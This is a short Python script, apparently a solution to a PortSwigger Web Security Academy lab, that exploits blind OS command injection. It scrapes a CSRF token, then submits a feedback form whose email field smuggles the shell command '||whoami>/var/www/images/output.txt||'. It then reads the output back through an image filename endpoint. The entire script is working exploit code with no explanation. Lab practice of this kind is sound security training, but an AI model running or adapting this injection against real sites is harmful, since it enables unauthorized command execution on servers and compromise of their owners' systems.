import requests
from bs4 import BeautifulSoup

site = 'ac5d1f191ef2d21380aa3c0d003500e9.web-security-academy.net'

s = requests.Session()
feedback_url = f'https://{site}/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = f'https://{site}/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'Rick Astley',
    'email' : 'email=||whoami>/var/www/images/output.txt||',
    'subject' : 'nevergiveyouup',
    'message' : 'baby'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.text)

pic_url = f'https://{site}/image?filename=output.txt'
resp = s.get(pic_url)
print(resp)